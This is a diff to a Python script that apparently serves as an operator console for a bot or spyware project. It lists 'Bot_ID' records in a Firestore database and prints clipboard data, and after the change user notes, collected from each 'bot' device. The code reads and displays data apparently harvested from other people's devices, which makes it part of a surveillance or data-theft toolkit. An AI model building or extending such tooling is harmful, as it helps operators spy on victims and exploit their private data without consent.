@@ -13,7 +13,7 @@ now = datetime.now()
 dt_string = now.strftime("%d-%m-%Y %H:%M:%S")
 
 lista = []
-docs = firestore_db.collection(u'portapapeles').where(u'Bot_ID', u'!=', "").stream()
+docs = firestore_db.collection(u'notasUsuario').where(u'Bot_ID', u'!=', "").stream()
 cantidad = 0
 for doc in docs:
     if(not(doc.get("Bot_ID") in lista)):
@@ -22,19 +22,32 @@ for doc in docs:
 print(lista)
 
 seleccionBot = input("Select a Bot ID or press enter to get the information for all available bots: ")
-if(seleccionBot == ""):
-    for i in lista:
-        doc_ref = firestore_db.collection(u'portapapeles').document(i)
+
+lista2 = []
+docs = firestore_db.collection(u'notasUsuario').where(u'Bot_ID', u'==', seleccionBot).stream()
+cantidad = 0
+for doc in docs:
+    if(not(doc.id in lista2)):
+        lista2.append(doc.id)
+
+print(lista2)
+
+seleccionBot2 = input("Select a day to see its note: ")
+
+if(seleccionBot2 == ""):
+    for i in lista2:
+        doc_ref = firestore_db.collection(u'notasUsuario').document(i)
         doc = doc_ref.get()
         if doc.exists:
-            print(f'Clipboard data for bot {i}: {doc.to_dict()}')
+            print(f'Device data for {i}: {doc.to_dict()}')
         else:
             print(u'The selected Bot ID is wrong or it does not exist on the Database')
 else:
-    doc_ref = firestore_db.collection(u'portapapeles').document(seleccionBot)
+    doc_ref = firestore_db.collection(u'notasUsuario').document(seleccionBot2)
     doc = doc_ref.get()
     if doc.exists:
-        print(f'Clipboard data: {doc.to_dict()}')
+        print(f'Device data for {seleccionBot}: {doc.to_dict()}')
     else:
         print(u'The selected Bot ID is wrong or it does not exist on the Database')
+
 print("\n")
